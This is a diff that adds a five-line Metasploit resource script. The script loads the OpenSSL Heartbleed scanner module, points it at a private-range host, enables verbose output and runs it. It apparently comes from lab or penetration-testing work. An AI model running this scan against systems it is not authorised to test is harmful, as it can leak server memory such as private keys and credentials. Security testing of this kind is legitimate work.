@@ -1,0 +1,5 @@
+use auxiliary/scanner/ssl/openssl_heartbleed  
+set RHOSTS 172.16.238.15 
+set verbose true 
+run  
+
